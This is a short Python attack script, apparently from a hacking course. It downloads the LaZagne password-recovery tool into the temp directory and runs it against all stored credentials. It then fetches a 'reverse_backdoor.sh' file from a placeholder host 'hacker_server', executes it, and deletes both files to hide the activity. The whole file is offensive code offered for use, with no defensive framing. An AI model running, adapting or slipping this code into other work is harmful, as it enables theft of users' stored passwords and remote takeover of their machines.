#!/usr/bin/env python

import requests
import subprocess
import re
import os
import tempfile


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)



temp_directory = tempfile.gettempdir()
os.chdir(temp_directory)
exec_file = "lazagne.exe"
download(f"https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/{exec_file}")
subprocess.Popen(exec_file + " all", shell=True)  # For Windows
subprocess.Popen("open " + exec_file + " all", shell=True)  # For OS X


download(f"http://hacker_server/reverse_backdoor.sh")
subprocess.call("reverse_backdoor.sh", shell=True)
os.remove(exec_file)
os.remove("reverse_backdoor.sh")
